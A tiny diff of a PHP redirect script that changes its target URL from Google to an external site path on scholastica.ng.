@@ -1,5 +1,5 @@
 <?php 
-$site = 'https://www.google.com';
+$site = 'http://scholastica.ng/schemes/agami';
 header('Location:'.$site);
 
 ?>
